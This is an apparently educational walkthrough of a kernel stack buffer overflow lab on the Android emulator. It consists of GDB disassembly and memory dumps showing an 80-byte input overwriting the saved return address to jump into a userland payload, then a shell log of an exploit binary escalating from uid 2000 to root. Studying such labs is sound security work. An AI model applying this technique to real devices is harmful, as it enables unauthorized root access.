Stack Buffer overflow
======================

```
arm-linux-androideabi-gdb vmlinux
GNU gdb (GDB) 7.3.1-gg2
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "--host=x86_64-linux-gnu --target=arm-linux-android".
For bug reporting instructions, please see:
<http://source.android.com/source/report-bugs.html>...
Reading symbols from goldfish/vmlinux...done.
(gdb) disassemble proc_entry_write
Dump of assembler code for function proc_entry_write:
   0xc0276b30 <+0>:     push    {r4, r5, lr}
   0xc0276b34 <+4>:     sub     sp, sp, #68     ; 0x44
   0xc0276b38 <+8>:     mov     r5, r1
   0xc0276b3c <+12>:    mov     r1, #64 ; 0x40
   0xc0276b40 <+16>:    mov     r0, sp
   0xc0276b44 <+20>:    mov     r4, r2
   0xc0276b48 <+24>:    bl      0xc01dd1e0 <__memzero>
   0xc0276b4c <+28>:    mov     r2, sp
   0xc0276b50 <+32>:    bic     r3, r2, #8128   ; 0x1fc0
   0xc0276b54 <+36>:    bic     r3, r3, #63     ; 0x3f
   0xc0276b58 <+40>:    ldr     r3, [r3, #8]
   0xc0276b5c <+44>:    adds    r2, r5, r4
   0xc0276b60 <+48>:    sbcscc  r2, r2, r3
   0xc0276b64 <+52>:    movcc   r3, #0
   0xc0276b68 <+56>:    cmp     r3, #0
   0xc0276b6c <+60>:    bne     0xc0276b8c <proc_entry_write+92>
   0xc0276b70 <+64>:    mov     r0, sp
   0xc0276b74 <+68>:    mov     r1, r5
   0xc0276b78 <+72>:    mov     r2, r4
   0xc0276b7c <+76>:    bl      0xc01dbd04 <__copy_from_user>
   0xc0276b80 <+80>:    cmp     r0, #0
   0xc0276b84 <+84>:    beq     0xc0276bb4 <proc_entry_write+132>
   0xc0276b88 <+88>:    b       0xc0276ba0 <proc_entry_write+112>
   0xc0276b8c <+92>:    cmp     r4, #0
   0xc0276b90 <+96>:    beq     0xc0276bb4 <proc_entry_write+132>
   0xc0276b94 <+100>:   mov     r0, sp
   0xc0276b98 <+104>:   mov     r1, r4
   0xc0276b9c <+108>:   bl      0xc01dd1e0 <__memzero>
   0xc0276ba0 <+112>:   ldr     r0, [pc, #24]   ; 0xc0276bc0
   0xc0276ba4 <+116>:   add     r0, pc, r0
   0xc0276ba8 <+120>:   bl      0xc03832e0 <printk>
   0xc0276bac <+124>:   mvn     r0, #13
   0xc0276bb0 <+128>:   b       0xc0276bb8 <proc_entry_write+136>
   0xc0276bb4 <+132>:   mov     r0, r4
   0xc0276bb8 <+136>:   add     sp, sp, #68     ; 0x44
   0xc0276bbc <+140>:   pop     {r4, r5, pc}

```

```
(gdb) break proc_entry_write
Breakpoint 1 at 0xc0276b30: file drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c, line 17.
(gdb) c
Continuing.
    
Breakpoint 1, proc_entry_write (file=0xd73276c0, ubuf=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, data=0x0) at drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c:17
17      {
(gdb) bt
#0  proc_entry_write (file=0xd73276c0, ubuf=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, data=0x0) at drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c:17
#1  0xc01046b0 in proc_file_write (file=0xd73276c0, buffer=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, ppos=<optimized out>) at fs/proc/generic.c:225
#2  0xc00ff958 in proc_reg_write (file=0xd73276c0, buf=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, ppos=0xd41dbf88) at fs/proc/inode.c:216
#3  0xc00b8434 in vfs_write (file=0xd73276c0, buf=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, pos=0xd41dbf88) at fs/read_write.c:435
#4  0xc00b8548 in sys_write (fd=<optimized out>, buf=<optimized out>, count=80) at fs/read_write.c:487
#5  0xc000ebc0 in ?? ()
#6  0xc000ebc0 in ?? ()
```


```
(gdb) break *0xc0276b78
(gdb) c
Continuing.

Breakpoint 1, 0xc0276b78 in copy_from_user (n=80, from=0xbe8f4a6c, to=0xd3f37ed8) at goldfish/arch/arm/include/asm/uaccess.h:421
421                     n = __copy_from_user(to, from, n);

(gdb) x/50xw $sp
0xd3f37ed8:     0x00000000      0x00000000      0x00000000      0x00000000
0xd3f37ee8:     0x00000000      0x00000000      0x00000000      0x00000000
0xd3f37ef8:     0x00000000      0x00000000      0x00000000      0x00000000
0xd3f37f08:     0x00000000      0x00000000      0x00000000      0x00000000
0xd3f37f18:     0xd3f01300      0xdea97b40      0xd3f01300      0xc01046b0
0xd3f37f28:     0xdea97b40      0xc0104610      0xd3f01300      0xd3f37f88
0xd3f37f38:     0x00000050      0xc00ff958      0x00000050      0xd3f01300
0xd3f37f48:     0xbe8f4a6c      0xd3f37f88      0x00000050      0xd3f36000
0xd3f37f58:     0x00000000      0xc00b8434      0xd3f01300      0xbe8f4a6c
0xd3f37f68:     0xd3f01300      0xbe8f4a6c      0x00000020      0x00000000
0xd3f37f78:     0x00000050      0xc00b8548      0x00000006      0x00000000
0xd3f37f88:     0x00000020      0x00000000      0x0001831c      0x00000006
0xd3f37f98:     0x00017ff4      0x00000004

(gdb) break *0xc0276b80
Breakpoint 2 at 0xc0276b80: file drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c, line 22.
(gdb) c
Continuing.

Breakpoint 2, proc_entry_write (file=<optimized out>, ubuf=0xbe927a6c 'A' <repeats 76 times>, "\\\201", count=80, data=<optimized out>) at drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/module/stack_buffer_overflow.c:22
22          if (copy_from_user(&buf, ubuf, count)) {
(gdb) x/50xw $sp
0xde1f9ed8:     0x41414141      0x41414141      0x41414141      0x41414141
0xde1f9ee8:     0x41414141      0x41414141      0x41414141      0x41414141
0xde1f9ef8:     0x41414141      0x41414141      0x41414141      0x41414141
0xde1f9f08:     0x41414141      0x41414141      0x41414141      0x41414141
0xde1f9f18:     0x41414141      0x41414141      0x41414141      0x0000815c
0xde1f9f28:     0xdea97b40      0xc0104610      0xde1ed900      0xde1f9f88
0xde1f9f38:     0x00000050      0xc00ff958      0x00000050      0xde1ed900
0xde1f9f48:     0xbe9efa6c      0xde1f9f88      0x00000050      0xde1f8000
0xde1f9f58:     0x00000000      0xc00b8434      0xde1ed900      0xbe9efa6c
0xde1f9f68:     0xde1ed900      0xbe9efa6c      0x00000020      0x00000000
0xde1f9f78:     0x00000050      0xc00b8548      0x00000006      0x00000000
0xde1f9f88:     0x00000020      0x00000000      0x0001831c      0x00000006
0xde1f9f98:     0x00017ff4      0x00000004
(gdb) break *0x0000815c
Breakpoint 3 at 0x815c
(gdb) C
Continuing.

Breakpoint 3, 0x0000815c in ?? ()
(gdb) display/10i $pc
1: x/10i $pc
=> 0x815c:      ldr     r3, [pc, #28]   ; 0x8180
   0x8160:      mov     r0, #0
   0x8164:      blx     r3
   0x8168:      ldr     r3, [pc, #20]   ; 0x8184
   0x816c:      blx     r3
   0x8170:      ldr     r0, [pc, #16]   ; 0x8188
   0x8174:      ldr     r4, [sp]
   0x8178:      ldr     r5, [sp, #8]
   0x817c:      bx      r0
   0x8180:      andgt   r12, r3, r4, lsl r8

```


```
root@generic:/ # su 2000
root@generic:/ $ id
uid=2000(shell) gid=2000(shell) context=u:r:su:s0
root@generic:/data/local/tmp $ ./kernel_buffer_overflow_exploit                                                   [+] enjoy the shell
root@generic:/data/local/tmp # id
uid=0(root) gid=0(root) context=u:r:kernel:s0
```
